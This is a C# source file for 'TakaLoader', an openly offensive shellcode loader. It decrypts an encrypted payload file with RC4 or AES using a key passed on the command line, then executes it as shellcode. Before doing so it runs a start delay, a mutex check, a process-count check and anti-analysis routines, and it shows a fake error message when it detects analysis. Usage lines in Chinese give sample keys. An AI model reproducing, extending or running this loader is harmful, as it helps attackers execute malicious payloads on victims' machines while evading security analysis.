using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using static TakaLoader.Config;
using System.Threading;

namespace TakaLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            string Taka = @"
 _____     _          _                     _
|_   _|_ _| | ____ _ | |    ___   __ _   __| | ___ _ __
  | |/ _` | |/ / _` || |   / _ \ / _` | / _` |/ _ \ '__|
  | | (_| |   < (_| || |__| (_) | (_| || (_| |  __/ |
  |_|\__,_|_|\_\__,_||_____\___/ \__,_| \__,_|\___|_|
================[Author: YangKe]======v1.2.1============
";
            Console.WriteLine(Taka);

            // Mutex check
            MutexControl.Check();

            Execution.CheckProcessCountAndExit();
            if (args.Length != 3)
            {
                Console.WriteLine("[*] 用法:");
                Console.WriteLine("\tTakaLoader.exe [payload_path] [decryption_method] [key]");
                Console.WriteLine("[*] 例如:");
                Console.WriteLine("\tTakaLoader.exe .\\aes_encrypt.bin aes 2m43G4WunugyzkVWbDslZBGCmfI9YcOS");
                Console.WriteLine("\tTakaLoader.exe .\\rc4_encrypt.bin rc4 xAMnBvkVHfTtq0SPoiqbfQghr5i6q57c");
                return;
            }

            // Start delay
            if (Config.StartDelay)
                StartDelay.Run();

            // Run AntiAnalysis modules
            if (AntiAnalysis.Run())
            {
                AntiAnalysis.FakeErrorMessage();
                return;
            }

            string payload_path = args[0];
            string decryption = args[1];
            string key = args[2];
            byte[] code = null;

            if (decryption.ToLower() == "rc4")
            {
                code = Execution.RC4_Decrypt(key, File.ReadAllBytes(payload_path));
            }
            else if (decryption.ToLower() == "aes")
            {
                code = Execution.AES_Decrypt(key, File.ReadAllBytes(payload_path));
            }
            else
            {
                Console.WriteLine("The input of Arg 2 is rc4 or aes");
            }

            // 执行Shellcode
            Execution.Exec(code);
        }
    }
}